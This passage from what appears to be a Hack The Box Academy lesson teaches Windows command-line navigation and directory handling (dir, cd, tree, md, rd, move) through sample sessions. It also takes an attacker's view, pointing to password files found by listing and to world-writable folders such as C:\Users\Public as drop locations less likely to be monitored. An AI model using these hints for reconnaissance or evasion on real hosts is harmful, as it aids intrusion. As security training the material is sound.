 Volume Serial Number is DAE9-<span class="hljs-number">5896</span>

 Directory of C:\Users\htb\Desktop

<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">59</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">59</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM                 <span class="hljs-number">0</span> file1<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM                 <span class="hljs-number">0</span> file2<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM                 <span class="hljs-number">0</span> file3<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">04</span>/<span class="hljs-number">13</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">24</span> AM             <span class="hljs-number">2</span>,<span class="hljs-number">391</span> Microsoft Teams<span class="hljs-selector-class">.lnk</span>
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">57</span> PM                 <span class="hljs-number">0</span> super-secret-sauce<span class="hljs-selector-class">.txt</span>
<span class="hljs-number">06</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">11</span>:<span class="hljs-number">59</span> PM                 <span class="hljs-number">0</span> write-secrets<span class="hljs-selector-class">.ps1</span>
               <span class="hljs-number">6</span> File(s)          <span class="hljs-number">2</span>,<span class="hljs-number">391</span> bytes
               <span class="hljs-number">2</span> Dir(s)  <span class="hljs-number">35</span>,<span class="hljs-number">102</span>,<span class="hljs-number">117</span>,<span class="hljs-number">888</span> bytes free
</code></pre>
<p>As seen through the example above, <code>dir</code> is an easy-to-use and surprisingly versatile command. Simply calling upon the command without any arguments will give us a listing of our current directory and its contents. As shown in the <a href="https://academy.hackthebox.com/module/167/section/1607">Getting Help</a> section, we can also use the <code>/?</code> argument to provide us with a complete listing of the dir&#39;s functionality and any additional arguments that we can provide to utilize it is advanced searching capabilities. In a later section, we will further discuss the meaning behind the above output and how we can use <code>dir</code> to aid us in our search for important files and directories. For now, understanding the basic usage of <code>dir</code> will provide us with more than enough utility to efficiently move around the system.</p>
<hr>
<h3 id="finding-our-place">Finding Our Place</h3>
<p>Before doing anything on a host, it is helpful to know where we are in the filesystem. We can determine that by utilizing the <code>cd</code> or <code>chdir</code> commands.</p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\htb&gt; cd 

<span class="hljs-symbol">C:</span>\htb
</code></pre>
<p>As shown by the example above, issuing the command without arguments gives us our <code>current working directory</code>. Our current working directory is our initial starting point. It describes our current directory as the one we are currently working in. Any command(s) run here without specifying the path of another directory or file will reference this initial point. This is very important, considering that everything we do moving forward will reference our current working directory unless specified otherwise.</p>
<hr>
<h3 id="moving-around-using-cd-chdir">Moving Around Using CD/CHDIR</h3>
<p>As we were busy finding our place on the system, we introduced the <code>cd</code> and <code>chdir</code> commands. However, we did not explore the full functionality of either. Besides listing our current directory, both serve an additional function. These commands will move us to whatever directory we specify after the command. The specified directory can either be a directory relative to our current working directory or an absolute directory starting from the filesystem&#39;s root.</p>
<p>Those familiar with <code>Linux</code> should begin to recognize this structure and be familiar with the difference between <code>relative paths</code> and <code>absolute paths</code>. However, assuming that we have not come into contact with either of these terms yet, let us quickly showcase the difference using the following examples:</p>
<p><strong>Current Working Directory</strong></p>
<pre><code class="lang-cmd-session"><span class="hljs-symbol">C:</span>\htb&gt; cd 

<span class="hljs-symbol">C:</span>\htb
</code></pre>
<p>This should look familiar, right? It is the same example used in the previous section. Let us expand upon this a bit. First, we need to define our <code>root</code> directory. To keep things simple, think of the <code>root</code> directory as the topmost directory in the structure, as it contains everything else within it. In this example, our <code>root</code> directory is <code>C:\</code>.</p>
<p>Note: <code>C:\</code> is the root directory of all Windows machines and has been determined so since it is inception in the MS-DOS and Windows 3.0 days. The &quot;C:\&quot; designation was used commonly as typically &quot;A:\&quot; and &quot;B:\&quot; were recognized as floppy drives, whereas &quot;C:\&quot; was recognized as the first internal hard drive of the machine.</p>
<p><strong>Absolute Path</strong></p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; cd C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\P</span>ictures

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\P</span>ictures&gt;
</code></pre>
<p>In this example, we can see that our initial working directory is located in <code>C:\htb</code>. We used <code>cd</code> and provided the path as our argument to move ourselves to the <code>C:\Users\htb\Pictures</code> directory. As we can see, the provided path starts with <code>C:\</code> as it is the root directory and follows the structure until it reaches its destination, being the <code>\Pictures</code> directory. Putting the pieces together, we can conclude that <code>C:\Users\htb\Pictures</code> would be considered the <code>absolute path</code> in this case as it follows the complete structure of the file system starting from the <code>root</code> directory and ending at the destination directory.</p>
<p><strong>Relative Path</strong></p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\h</span>tb&gt; cd .<span class="hljs-symbol">\P</span>ictures

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\P</span>ictures&gt;
</code></pre>
<p>On the other hand, following this example, we can see that something is slightly off in how our path is specified in the <code>cd</code> command. Instead of starting from the <code>root</code> directory, we are greeted with a <code>.</code> followed by the destination directory (<code>\Pictures</code>). The <code>.</code> character points to one directory down from our current working directory (<code>C:\htb</code>). Using our working directory as the starting point to reference directories either above it or below it in the file system hierarchy is considered a <code>relative path</code>, as its position is relative to the current working directory.</p>
<p>Understanding both of these terms is imperative as we can effectively use this knowledge of the file system&#39;s hierarchy to move up and down the file structure with ease. We can piece everything together through one last example to show how quickly we can use what we have learned so far to move about the system.</p>
<p>We are currently in the <code>C:\Users\htb\Pictures</code> directory provided in our previous example. However, we wish to quickly move all the way back to the root of the file system in just one command. To do so, we can perform the following:</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-tag">\<span class="hljs-name">Users</span></span><span class="hljs-tag">\<span class="hljs-name">htb</span></span><span class="hljs-tag">\<span class="hljs-name">Pictures</span></span>&gt;  cd ..<span class="hljs-tag">\<span class="hljs-name">.</span></span>.<span class="hljs-tag">\<span class="hljs-name">.</span></span>.<span class="hljs-tag">\<span class="hljs-name">
</span></span>
C:<span class="hljs-tag">\<span class="hljs-name">&gt;</span></span>
</code></pre>
<p>This one command lets us move up the directory structure, starting from the <code>\Pictures</code> directory and moving up to the <code>root</code> directory in one swift stroke. Pretty neat, huh? Understanding this fundamental concept will be very important moving forward, so we should practice and familiarize ourselves now while we have the chance.</p>
<hr>
<h3 id="exploring-the-file-system">Exploring the File System</h3>
<p>Using our newfound skills, we should branch out and explore the system earnestly. Thorough exploration is essential, as it can help us gain a considerable advantage in understanding the layout of the system we are interacting with and the files contained within. However, when looking around the filesystem of a Windows host, it can get tedious to change our directory back and forth or to issue the <code>dir</code> command for each sub-directory. To save us a bit of time and gain some efficiency, we can get a printout of the entire path we specify and its subdirectories by utilizing the <code>tree</code> command.</p>
<p><strong>Listing the Contents of the File System</strong></p>
<pre><code class="lang-cmd-session"><span class="hljs-keyword">C</span>:\htb\student\&gt; tree

Folder PATH listing
Volume serial number is <span class="hljs-number">26E7</span><span class="hljs-number">-9</span>EE4
<span class="hljs-keyword">C</span>:.
├───<span class="hljs-number">3</span><span class="hljs-keyword">D</span> Objects
├───Contacts
├───Desktop
├───Documents
├───Downloads
├───Favorites
│   └───<span class="hljs-keyword">Links</span>
├───<span class="hljs-keyword">Links</span>
├───Music
├───OneDrive
├───Pictures
│   ├───Camera Roll
│   └───Saved Pictures
├───Saved Games
├───Searches
└───Videos
    └───Captures
</code></pre>
<p>From a hacker perspective, this can be super useful when searching for files and folders with juicy information we may want, like configurations, project files and folders, and maybe even that holy grail, a file or folder containing passwords. We can utilize the <code>/F</code> parameter with the tree command to see a listing of each file and the directories along with the directory tree of the path.</p>
<p><strong>Tree /F</strong></p>
<p>System Navigation</p>
<pre><code class="lang-cmd-session">C:\htb\student\&gt; tree /F

Folder PATH listing
Volume serial number is <span class="hljs-number">26</span>E7-<span class="hljs-number">9</span>EE4
C:.
├───<span class="hljs-number">3</span>D Objects
├───Contacts
├───Desktop
│       passwords<span class="hljs-selector-class">.txt</span><span class="hljs-selector-class">.txt</span>
│       Project plans<span class="hljs-selector-class">.txt</span>
│       secrets<span class="hljs-selector-class">.txt</span>
│
├───Documents
├───Downloads
├───Favorites
│   │   Bing<span class="hljs-selector-class">.URL</span>
│   │
│   └───Links
├───Links
│       Desktop<span class="hljs-selector-class">.lnk</span>
│       Downloads<span class="hljs-selector-class">.lnk</span>
│
├───Music
├───OneDrive
├───Pictures
│   ├───Camera Roll
│   └───Saved Pictures
├───Saved Games
├───Searches
│       winrt--{S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1588464669</span>-<span class="hljs-number">3682530959</span>-<span class="hljs-number">1994202445</span>-<span class="hljs-number">1000</span>}-<span class="hljs-selector-class">.searchconnector-ms</span>
│
└───Videos
    └───Captures

    &lt;SNIP&gt;
</code></pre>
<p>From this example, we can quickly get a feel for the system and see some juicy files such as <code>passwords.txt.txt</code> and <code>secrets.txt</code>. Of course, since this performs a complete listing of every single file and directory on a system, we must be aware of how much output this command will kick up. Later during the module, we will learn a more manageable way of handling the output and working with other command line applications to manipulate it into a much more desirable format. For now, be aware that after attempting to run this command, we should probably interrupt its execution using <code>Ctrl-C</code> after retrieving the desired information.</p>
<hr>
<h3 id="interesting-directories">Interesting Directories</h3>
<p>As promised, we have nearly reached the end of this section. With our current skill set, navigating the system should be much more approachable now than initially seemed. Let us take a minute to discuss some directories that can come in handy from an attacker&#39;s perspective on a system. Below is a table of common directories that an attacker can abuse to drop files to disk, perform reconnaissance, and help facilitate attack surface mapping on a target host.</p>
<table>
<thead>
<tr>
<th>Name:</th>
<th>Location:</th>
<th>Description:</th>
</tr>
</thead>
<tbody>
<tr>
<td>%SYSTEMROOT%\Temp</td>
<td><code>C:\Windows\Temp</code></td>
<td>Global directory containing temporary system files accessible to all users on the system. All users, regardless of authority, are provided full read, write, and execute permissions in this directory. Useful for dropping files as a low-privilege user on the system.</td>
</tr>
<tr>
<td>%TEMP%</td>
<td><code>C:\Users\&lt;user&gt;\AppData\Local\Temp</code></td>
<td>Local directory containing a user&#39;s temporary files accessible only to the user account that it is attached to. Provides full ownership to the user that owns this folder. Useful when the attacker gains control of a local/domain joined user account.</td>
</tr>
<tr>
<td>%PUBLIC%</td>
<td><code>C:\Users\Public</code></td>
<td>Publicly accessible directory allowing any interactive logon account full access to read, write, modify, execute, etc., files and subfolders within the directory. Alternative to the global Windows Temp Directory as it&#39;s less likely to be monitored for suspicious activity.</td>
</tr>
<tr>
<td>%ProgramFiles%</td>
<td><code>C:\Program Files</code></td>
<td>folder containing all 64-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.</td>
</tr>
<tr>
<td>%ProgramFiles(x86)%</td>
<td><code>C:\Program Files (x86)</code></td>
<td>Folder containing all 32-bit applications installed on the system. Useful for seeing what kind of applications are installed on the target system.</td>
</tr>
</tbody>
</table>
<p>The table provided above is by no means an all-encompassing list of all interesting directories on a Windows host. However, these will likely be targeted as they are useful to attackers.</p>
<p>With the end of this section, we have become proficient at moving around the Windows filesystem and understanding where we are in relation to other directories and files on the system. In the next section, we will discuss gathering system information to provide us with a solid understanding of our surrounding environment.</p>
<h2 id="working-with-directories-and-files">Working with Directories and Files</h2>
<hr>
<p>Now that we can safely navigate via the command line, it is time to master the art of files and directories. This can be a robust topic; we have several ways to accomplish the same tasks with Windows. We will cover a few but keep in mind that there are many other ways to work with files and directories. Let us dive in.</p>
<hr>
<h3 id="directories">Directories</h3>
<p>What is a directory? In this case, it is an overarching folder structure within the Windows filesystem. Our files are nested within this folder structure, and we can move around utilizing common commands we practiced in the last section, such as <code>cd</code> and <code>dir</code>.</p>
<p>Revisiting our hallway concept from the last section for a second when thinking about directories, we can break it down like this:</p>
<ul>
<li>The Drive itself is a disk, but it is also the root directory. So think about the <code>C:</code> drive as our hotel.</li>
<li>That hotel has many different floors filled with hallways. This level would include directories like <code>Windows</code>, <code>Users</code>, <code>Program Files</code>, and any other directories created by the operating system or the users.</li>
<li>These floors have multiple halls. Think of each hall as a folder nested with our previous directories. So for the case of Users, we would then have a folder for each user logged into the host. At this point, we are several levels deep into the filesystem. (C:\Users\htb) as an example of a directory.</li>
<li>This continues with other hallways (directories) as the use of the host expands and more software is installed.</li>
<li>Eventually, we find the room we were looking for and peek in. Think of the door as a file within the directory hive.</li>
</ul>
<h4 id="viewing-listing-directories">Viewing &amp; Listing Directories</h4>
<p>As we said in the previous section, we can issue the &#39;cd&#39; command when trying to see what directory we currently reside in. To get a listing of what files are within a directory, we can use the <code>dir</code> command, and <code>tree</code> provides a complete listing of all files and folders within the specified path. So it is nice to see we already have a head start.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/three-cmd.png" alt="image"></p>
<p>The image above shows how the three can be used in conjunction. <code>chdir</code> can also change our current working directory.</p>
<h4 id="create-a-new-directory">Create A New Directory</h4>
<p>Creating a directory to add to our structure is a simple endeavor. We can utilize the <code>md</code> and <code>mkdir</code> commands.</p>
<p><strong>Using MD</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt; dir

 Volume in drive C has no label.
 Volume Serial Number is <span class="hljs-number">26</span>E7-<span class="hljs-number">9</span>EE4

 Directory of C:\Users\htb\Desktop

<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">37</span> PM                <span class="hljs-number">19</span> <span class="hljs-keyword">file</span>.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">32</span> PM    &lt;DIR&gt;          Git-Pulls
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">59</span> PM                <span class="hljs-number">26</span> normal-<span class="hljs-keyword">file</span>.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Notes
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">28</span> PM                <span class="hljs-number">97</span> passwords.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">34</span> PM                <span class="hljs-number">97</span> <span class="hljs-keyword">Project</span> plans.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">08</span>:<span class="hljs-number">38</span> PM               <span class="hljs-number">114</span> secrets.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Work-Policies
               <span class="hljs-number">5</span> <span class="hljs-keyword">File</span>(s)            <span class="hljs-number">353</span> bytes
               <span class="hljs-number">5</span> Dir(s)  <span class="hljs-number">38</span>,<span class="hljs-number">644</span>,<span class="hljs-number">342</span>,<span class="hljs-number">784</span> bytes free

C:\Users\htb\Desktop&gt;md <span class="hljs-keyword">new</span>-directory

C:\Users\htb\Desktop&gt;dir
 Volume in drive C has no label.
 Volume Serial Number is <span class="hljs-number">26</span>E7-<span class="hljs-number">9</span>EE4

 Directory of C:\Users\htb\Desktop

<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">26</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">26</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">37</span> PM                <span class="hljs-number">19</span> <span class="hljs-keyword">file</span>.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">32</span> PM    &lt;DIR&gt;          Git-Pulls
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">26</span> PM    &lt;DIR&gt;          <span class="hljs-keyword">new</span>-directory
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">59</span> PM                <span class="hljs-number">26</span> normal-<span class="hljs-keyword">file</span>.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Notes
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">28</span> PM                <span class="hljs-number">97</span> passwords.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">34</span> PM                <span class="hljs-number">97</span> <span class="hljs-keyword">Project</span> plans.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">08</span>:<span class="hljs-number">38</span> PM               <span class="hljs-number">114</span> secrets.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Work-Policies
               <span class="hljs-number">5</span> <span class="hljs-keyword">File</span>(s)            <span class="hljs-number">353</span> bytes
               <span class="hljs-number">6</span> Dir(s)  <span class="hljs-number">38</span>,<span class="hljs-number">644</span>,<span class="hljs-number">277</span>,<span class="hljs-number">248</span> bytes free
</code></pre>
<p>Above, <code>md</code> is in use. In the next shell, we will see <code>mkdir</code> used similarly. Both accomplish the same goal, so use either as you wish.</p>
<p><strong>Using mkdir to Create Directories.</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt; <span class="hljs-keyword">mkdir</span> yet-another-<span class="hljs-keyword">dir</span>

C:\Users\htb\Desktop&gt;<span class="hljs-keyword">dir</span>
 Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop

06/15/2021  10:28 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          .
06/15/2021  10:28 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          ..
06/14/2021  10:37 PM                19 <span class="hljs-keyword">file</span>.txt
06/15/2021  09:32 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          Git-Pulls
06/15/2021  10:26 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          new-directory
06/14/2021  10:59 PM                26 normal-<span class="hljs-keyword">file</span>.txt
06/15/2021  09:29 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          <span class="hljs-keyword">Notes</span>
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
06/15/2021  09:29 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          Work-Policies
06/15/2021  10:28 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          yet-another-<span class="hljs-keyword">dir</span>
               5 <span class="hljs-keyword">File</span>(s)            353 bytes
               7 <span class="hljs-keyword">Dir</span>(s)  38,644,056,064 bytes free
</code></pre>
<h4 id="delete-directories">Delete Directories</h4>
<p>Deleting directories can be accomplished using the <code>rd</code> or <code>rmdir</code> commands. The commands rd and rmdir are explicitly meant for removing directory trees and do not deal with specific files or attributes.</p>
<p>Let us look at <code>rd</code> and <code>rmdir</code> now.</p>
<p><strong>RD &amp; RMDIR</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt; dir

 Volume in drive C has no label.
 Volume Serial Number is <span class="hljs-number">26</span>E7-<span class="hljs-number">9</span>EE4

 Directory of C:\Users\htb\Desktop

<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          .
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          ..
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">37</span> PM                <span class="hljs-number">19</span> <span class="hljs-keyword">file</span>.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">32</span> PM    &lt;DIR&gt;          Git-Pulls
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">26</span> PM    &lt;DIR&gt;          <span class="hljs-keyword">new</span>-directory
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">59</span> PM                <span class="hljs-number">26</span> normal-<span class="hljs-keyword">file</span>.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Notes
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">28</span> PM                <span class="hljs-number">97</span> passwords.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">34</span> PM                <span class="hljs-number">97</span> <span class="hljs-keyword">Project</span> plans.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/14/</span><span class="hljs-number">2021</span>  <span class="hljs-number">08</span>:<span class="hljs-number">38</span> PM               <span class="hljs-number">114</span> secrets.txt
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">09</span>:<span class="hljs-number">29</span> PM    &lt;DIR&gt;          Work-Policies
<span class="hljs-number">06</span><span class="hljs-regexp">/15/</span><span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">28</span> PM    &lt;DIR&gt;          yet-another-dir
               <span class="hljs-number">5</span> <span class="hljs-keyword">File</span>(s)            <span class="hljs-number">353</span> bytes
               <span class="hljs-number">7</span> Dir(s)  <span class="hljs-number">38</span>,<span class="hljs-number">634</span>,<span class="hljs-number">733</span>,<span class="hljs-number">568</span> bytes free

C:\Users\htb\Desktop&gt; rd Git-Pulls
The directory is not empty.
</code></pre>
<p><strong>RD /S</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt; rd /S Git-Pulls
Git-Pulls, Are you sure (Y/<span class="hljs-keyword">N</span>)? <span class="hljs-built_in">Y</span>

C:\Users\htb\Desktop&gt;<span class="hljs-keyword">dir</span>
 Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is 26E7-9EE4

 Directory of C:\Users\htb\Desktop

06/16/2021  01:32 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          .
06/16/2021  01:32 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          ..
06/14/2021  10:37 PM                19 <span class="hljs-keyword">file</span>.txt
06/15/2021  10:26 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          new-directory
06/14/2021  10:59 PM                26 normal-<span class="hljs-keyword">file</span>.txt
06/15/2021  09:29 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          <span class="hljs-keyword">Notes</span>
06/14/2021  10:28 PM                97 passwords.txt
06/14/2021  10:34 PM                97 Project plans.txt
06/14/2021  08:38 PM               114 secrets.txt
06/15/2021  09:29 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          Work-Policies
06/15/2021  10:28 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          yet-another-<span class="hljs-keyword">dir</span>
               5 <span class="hljs-keyword">File</span>(s)            353 bytes
               6 <span class="hljs-keyword">Dir</span>(s)  38,634,733,568 bytes free
</code></pre>
<p>In the session above, we listed the directory to see its contents, then issued the <code>rd Git-Pulls</code> command. From the first session window, we can see that it did not execute the command since the directory was not empty. Rd has a switch <code>/S</code> that we can utilize to erase the directory and its contents. Since we want to make Git-Pulls disappear, we will issue it in the second cmd session seen above. The commands we have issued with <code>rd</code> are the same as <code>rmdir</code>.</p>
<p>Removing directories is pretty simple. If you get stuck trying to remove a directory and are getting a warning saying the directory is not empty, do not forget about the <code>/S</code> switch.</p>
<h4 id="modifying">Modifying</h4>
<p>Modifying a directory is more complicated than changing a file. The directory holds data within it for other files or directories. We have several options in any case. <code>Move</code>, <code>Robocopy</code>, and <code>xcopy</code> can copy and make changes to directories and their structures.</p>
<p>To use <code>move</code>, we have to issue the syntax in this order. When moving directories, it will take the directory and any files within and move it from the <code>source</code> to the <code>destination</code> path specified.</p>
<p><strong>Move a Directory</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop&gt; tree example /F

Folder PATH listing
Volume serial number is 00000032 DAE9:5896
C:<span class="hljs-symbol">\U</span>SERS<span class="hljs-symbol">\H</span>TB<span class="hljs-symbol">\D</span>ESKTOP<span class="hljs-symbol">\E</span>XAMPLE
│   file-1 - Copy.txt
│   file-1.txt
│   file-2.txt
│   file-3.txt
│   file-5.txt
│   ‎file-4.txt
│
└───more stuff

C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>esktop&gt; move example C:<span class="hljs-symbol">\U</span>sers<span class="hljs-symbol">\h</span>tb<span class="hljs-symbol">\D</span>ocuments<span class="hljs-symbol">\e</span>xample

        1 dir(s) moved.
</code></pre>
<p>We ran the tree command to see what resided in the example directory before copying it. After that, executing <code>move example C:\Users\htb\Documents\example</code> placed the example directory and all its files into the user&#39;s Documents folder. We can validate this by running a dir on Documents to see if the directory exists.</p>
<p><strong>Validate the Move</strong></p>
<p>Working with Directories and Files</p>
<pre><code class="lang-cmd-session">C:\Users\htb\Desktop&gt; <span class="hljs-keyword">dir</span> C:\Users\htb\Documents

Volume <span class="hljs-keyword">in</span> drive C has <span class="hljs-keyword">no</span> <span class="hljs-keyword">label</span>.
 Volume Serial Number is DAE9-5896

 Directory of C:\Users\htb\Documents

06/17/2021  03:14 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          .
06/17/2021  03:14 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          ..
06/17/2021  02:23 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          example
06/17/2021  02:01 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          <span class="hljs-keyword">test</span>
04/13/2021  12:21 PM    &lt;<span class="hljs-keyword">DIR</span>&gt;          WindowsPowerShell
04/22/2021  01:11 PM           933,003 Wireshark-<span class="hljs-keyword">lab</span>-2.pcap
               1 <span class="hljs-keyword">File</span>(s)        933,003 bytes
               5 <span class="hljs-keyword">Dir</span>(s)  36,644,110,336 bytes free
</code></pre>
<p>Moreover, there we have it. The directory <code>example</code> exists now within the Documents directory. The following two options have more capability in the ways they can interact with files and directories. We will take a minute to look at <code>xcopy</code> since it still exists in current Windows operating systems, but it is essential to know that it has been deprecated for <code>robocopy</code>. Where xcopy shines is that it can remove the Read-only bit from files when moving them. The syntax for <code>xcopy</code> is <code>xcopy</code> <code>source</code> <code>destination</code> <code>options</code>. As it was with move, we can use wildcards for source files, not destination files.</p>
<p><strong>Using Xcopy</strong></p>
<p>Working with Directories and Files</p>
